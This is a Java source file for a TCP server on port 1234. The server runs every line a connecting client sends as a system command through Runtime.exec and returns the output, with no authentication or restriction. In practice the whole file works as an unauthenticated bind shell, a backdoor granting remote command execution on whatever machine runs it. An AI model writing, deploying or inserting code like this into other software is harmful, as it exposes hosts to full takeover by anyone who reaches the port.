import java.io.*;
import java.net.*;

public class Server {
    private static final int PORT = 1234;

    public static void main(String[] args) {
        ServerSocket serverSocket = null;
        Socket socket = null;
        BufferedReader inputReader = null;
        PrintWriter outputWriter = null;

        try {
            serverSocket = new ServerSocket(PORT);
            System.out.println("Server started. Waiting for clients...");

            while (true) {
                socket = serverSocket.accept();
                System.out.println("Client connected: " + socket);

                inputReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                outputWriter = new PrintWriter(socket.getOutputStream(), true);

                String command;
                while ((command = inputReader.readLine()) != null) {
                    if (command.equalsIgnoreCase("exit")) {
                        break;
                    }
                    System.out.println("Executing command: " + command);

                    String output = executeCommand(command);
                    outputWriter.println(output);
                }

                inputReader.close();
                outputWriter.close();
                socket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (serverSocket != null) serverSocket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @SuppressWarnings("deprecation")
    private static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        Process process;
        try {
            process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            output.append("Error executing command: ").append(e.getMessage());
        }
        return output.toString();
    }
}
